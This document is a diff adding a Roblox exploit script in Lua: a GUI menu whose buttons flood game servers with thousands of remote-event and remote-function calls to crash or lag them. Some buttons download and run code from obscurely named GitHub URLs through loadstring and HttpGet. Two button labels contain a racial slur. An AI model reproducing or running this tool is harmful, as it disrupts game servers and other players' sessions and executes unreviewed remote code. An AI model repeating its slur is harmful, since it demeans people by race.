@@ -1,1 +1,36 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Shyroyu123/sd-pfosspdomfs-pd-324234w-nd-popsa/main/sdpğfmosdğpfs%24£%24£%234"))()
+local Window = Library.CreateLib("LzagiOnTop", "BloodTheme")
 
+-- ANA
+local main = Window:NewTab("LzagiCrash")
+local Section1 = main:NewSection("LzagiCrash")
+Section1:NewButton("NİGGAKİLLER", "This command send server 7000 request.", function()
+        for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end    wait(10)    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end    wait(10)    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end    for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end     for i = 1, 1000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+end)
+
+Section1:NewButton("NİGGAKİLLER", "This command send oerver 4000 request.", function()
+    for i = 1, 4000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end wait(5) for i = 1, 3000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
+end)
+local Tab = Window:NewTab("Adonis")
+local Section = Tab:NewSection("Adonis")
+Section:NewTextBox("Adonis Security Remote Name :", "Buraya darkdexden bakıcağın remotenin adini gir.", function(txt)
+	for i = 1, 10000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild(txt) Event:FireServer(A_1)   end
+end)
+local HDAdminCrash = Window:NewTab("Game Crash Scripts")
+
+local hdadminsection = HDAdminCrash:NewSection("GPO Crash")
+local wauxysection = HDAdminCrash:NewSection("Wauxy Crash")
+wauxysection:NewButton("Wauxy Crash", "Wauxy Crash", function() 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Shyroyu123/asdafsdfdfgsfdga/main/uwuwuwusaudasdoasdı½½>£%23123342"))()
+end)
+hdadminsection:NewButton("GPO Crash", "GPO", function ()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/bycrybaas3af/asdasdasasdasd/main/gpocrash"))()
+    end)
+local hdadmin = Window:NewTab("HD Admin Lag Sever")
+local hdadminsecenek = hdadmin:NewSection("HD Admin Lag Server")
+hdadminsecenek:NewButton("HD Admin Lag", "This button lag server w/ hd admin", function()
+local remoteFuncs = { } do        local function fetch( _, item )            if item:IsA( 'RemoteFunction' ) then                table.insert( remoteFuncs, item )            end        end table.foreach( game:GetDescendants( ), fetch )        table.foreach( getnilinstances( ), fetch )     end for _ = 1, 5000 do        for _, remoteFunc in next, remoteFuncs do            coroutine.wrap( remoteFunc.InvokeServer )( remoteFunc )        end     end     wait(10)     for _ = 1, 20000 do        for _, remoteFunc in next, remoteFuncs do            coroutine.wrap( remoteFunc.InvokeServer )( remoteFunc )        end    end wait(10)    for i = 1, 15000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("PJR") Event:FireServer(A_1)   end
+end)
+local credit = Window:NewTab("Credit")
+local Section2 = credit:NewSection("stealedbylzagi")
+local Section3 = credit:NewSection("stealedbylzagi")
